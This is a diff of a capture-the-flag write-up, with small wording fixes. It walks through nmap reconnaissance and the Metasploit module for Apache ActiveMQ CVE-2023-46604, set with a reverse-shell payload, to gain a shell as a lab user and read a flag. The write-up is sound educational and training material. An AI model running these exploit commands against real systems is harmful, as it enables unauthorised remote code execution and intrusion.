@@ -36,11 +36,10 @@ msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > exploit
 
 cat /home/activemq/user.txt
 EPT{d41d8cd98f00b204e9800998ecf8427e}
-
 ```
 
 ## Explanation
-To get some information about the host we started by running `nmap -A -sS -p- -Pn 10.128.2.185` to gather information about open ports and services.
+We started by running `nmap -A -sS -p- -Pn 10.128.2.185` to gather information about open ports and services.
 
 ```
 $ nmap -A -sS -p- -Pn 10.128.2.185
@@ -80,7 +79,7 @@ This was really interesting. We could listen to messages with `mosquitto_sub -v 
 
 ![Web Panel and mosquitto_sub](image.png)
 
-We do not have a shell yet, so let's look for some other way in. Looking for Apache ActiveMQ exploits we find a metasploit exploit that can give us a reverse shell. It's called `multi/misc/apache_activemq_rce_cve_2023_46604`. Let's try it.
+We do not have a shell yet, so let's look for some other way in. Looking for Apache ActiveMQ exploits we find a metasploit exploit that could give us a reverse shell. It's called `multi/misc/apache_activemq_rce_cve_2023_46604`. Let's try it.
 
 Launching the metasploit console
 ```
@@ -135,11 +134,11 @@ Module options (exploit/multi/misc/apache_activemq_rce_cve_2023_46604):
 
 ```
 
-use `set` to set RHOSTS. RHOSTS is one or multiple remote hosts to exploit.
+Use `set` to set RHOSTS. RHOSTS in metasploit is one or multiple remote hosts you want to exploit.
 ```
 msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > set RHOSTS 10.128.2.185
 ```
-Set the payload to `cmd/unix/reverse`. The payload defines what to do when we have executed the exploit successfully. This could be reading files, creationg users or opening a reverse shell. We want that reverse shell. To see all available payloads for the exploit you can run `show payloads`.
+Set the payload to `cmd/unix/reverse`. The payload defines what to do when we have executed the exploit successfully. This could be reading files, creating users or opening a reverse shell. We want that reverse shell. To see all available payloads for the exploit you can run `show payloads`.
 
 ```
 msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > set payload cmd/unix/reverse
@@ -173,7 +172,7 @@ dir
 bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var
 boot  etc  lib	 media	opt  root  sbin  sys  usr
 ```
-We now have a reverse shell. Let's use metasploit to give us a proper bash shell by running `shell`
+We now have a reverse shell. Let's use metasploit to give us a proper bash shell by running `shell`.
 
 ```
 shell
@@ -188,7 +187,7 @@ shell
 whoami
 prime
 ```
-We now have a shell in the context of the prime user. Let's look around for a bit
+We now have a shell in the context of the prime user. Let's look around for a bit.
 ```
 [prime@ip-10-128-2-185 /]$ cd
 cd
